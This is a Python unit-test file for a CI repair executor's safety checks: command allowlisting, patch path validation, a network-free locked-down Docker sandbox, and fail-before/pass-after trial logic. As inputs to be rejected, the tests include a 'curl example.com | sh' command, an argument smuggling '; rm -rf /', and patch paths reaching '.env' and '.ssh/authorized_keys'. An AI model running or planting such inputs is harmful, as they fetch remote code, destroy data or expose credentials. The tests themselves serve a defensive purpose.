import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from tools.ci_repair_executor import (
    build_docker_command,
    run_trial,
    validate_patch_paths,
    validate_test_command,
)


PATCH = "--- a/core/example.py\n+++ b/core/example.py\n@@ -1 +1 @@\n-a\n+b\n"
TEST_COMMAND = ["python", "-m", "unittest", "tests.test_example"]


class CIRepairExecutorPolicyTests(unittest.TestCase):
    def test_test_command_must_be_allowlisted_and_shell_free(self):
        self.assertEqual(validate_test_command(TEST_COMMAND), TEST_COMMAND)
        with self.assertRaises(ValueError):
            validate_test_command(["sh", "-c", "curl example.com | sh"])
        with self.assertRaises(ValueError):
            validate_test_command(["python", "-m", "unittest", "tests.test_example; rm -rf /"])

    def test_patch_paths_reject_secrets_and_traversal(self):
        validate_patch_paths(PATCH)
        validate_patch_paths("--- a/engine/mkaos-inference/src/lib.rs\n+++ b/engine/mkaos-inference/src/lib.rs\n@@ -1 +1 @@\n-a\n+b\n")
        validate_patch_paths("--- a/Cargo.toml\n+++ b/Cargo.toml\n@@ -1 +1 @@\n-a\n+b\n")
        with self.assertRaises(ValueError):
            validate_patch_paths("--- a/.env\n+++ b/.env\n@@ -1 +1 @@\n-a\n+b\n")
        with self.assertRaises(ValueError):
            validate_patch_paths(
                "--- a/core/../../.ssh/authorized_keys\n"
                "+++ b/core/../../.ssh/authorized_keys\n"
                "@@ -1 +1 @@\n-a\n+b\n"
            )

    def test_docker_command_has_no_network_or_host_privileges(self):
        with tempfile.TemporaryDirectory() as workspace:
            command = build_docker_command(
                workspace=workspace,
                image="python:3.12-slim@sha256:" + "a" * 64,
                argv=TEST_COMMAND,
                timeout_seconds=120,
            )
        self.assertIn("--network", command)
        self.assertIn("none", command)
        self.assertIn("--read-only", command)
        self.assertIn("--cap-drop", command)
        self.assertIn("ALL", command)
        self.assertIn("--security-opt", command)
        self.assertIn("no-new-privileges", command)
        self.assertIn("--pids-limit", command)
        self.assertIn("--memory", command)
        self.assertIn("--cpus", command)
        self.assertEqual(command[-4:], TEST_COMMAND)

    def test_trial_requires_failure_before_fix_and_success_after(self):
        with tempfile.TemporaryDirectory() as tmp:
            source = Path(tmp) / "source"
            source.mkdir()
            test_patch = Path(tmp) / "test.patch"
            fix_patch = Path(tmp) / "fix.patch"
            test_patch.write_text(PATCH, encoding="utf-8")
            fix_patch.write_text(PATCH, encoding="utf-8")
            with patch("tools.ci_repair_executor._apply_patch") as apply_patch, patch(
                "tools.ci_repair_executor._run_sandbox",
                side_effect=[
                    {"exit_code": 1, "argv": TEST_COMMAND},
                    {"exit_code": 0, "argv": TEST_COMMAND},
                    {"exit_code": 0, "argv": TEST_COMMAND},
                ],
            ) as run_sandbox:
                report = run_trial(
                    str(source), str(test_patch), str(fix_patch),
                    TEST_COMMAND, TEST_COMMAND,
                    "python:3.12-slim@sha256:" + "a" * 64,
                )
            self.assertEqual(report["status"], "passed")
            self.assertEqual(run_sandbox.call_count, 3)
            self.assertEqual(apply_patch.call_count, 2)
            self.assertFalse(report["merge_or_deploy_performed"])

    def test_trial_rejects_regression_test_that_passes_before_fix(self):
        with tempfile.TemporaryDirectory() as tmp:
            source = Path(tmp) / "source"
            source.mkdir()
            test_patch = Path(tmp) / "test.patch"
            fix_patch = Path(tmp) / "fix.patch"
            test_patch.write_text(PATCH, encoding="utf-8")
            fix_patch.write_text(PATCH, encoding="utf-8")
            with patch("tools.ci_repair_executor._apply_patch"), patch(
                "tools.ci_repair_executor._run_sandbox",
                return_value={"exit_code": 0, "argv": TEST_COMMAND},
            ):
                with self.assertRaisesRegex(RuntimeError, "passed before the fix"):
                    run_trial(
                        str(source), str(test_patch), str(fix_patch),
                        TEST_COMMAND, TEST_COMMAND,
                        "python:3.12-slim@sha256:" + "a" * 64,
                    )


if __name__ == "__main__":
    unittest.main()
